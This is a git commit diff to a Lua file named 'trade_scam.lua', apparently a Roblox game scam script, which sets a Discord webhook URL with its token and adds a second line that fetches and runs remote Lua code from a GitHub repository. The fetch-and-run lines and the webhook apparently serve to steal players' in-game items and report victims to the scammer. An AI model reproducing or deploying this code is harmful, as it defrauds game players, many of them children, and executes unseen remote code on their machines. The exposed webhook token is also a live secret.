2f239bace65eebb518427379e62e5e394abf309b
thatboyskulls12 <aj.skulls12@gmail.com>
2025-07-08 18:52:56 -0400

    Update trade_scam.lua

--- trade_scam.lua
+++ trade_scam.lua
@@ -5,4 +5,6 @@ _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1389819831263432724/ghC-hYXflTHCvP3KmqFECs-4mHBxOnkQvJXTOd5UNdsCsbmidraYV_ELhs3KvWUAH6g8" -- change to your webhook
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/source_1.lua"))()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/source.lua"))()
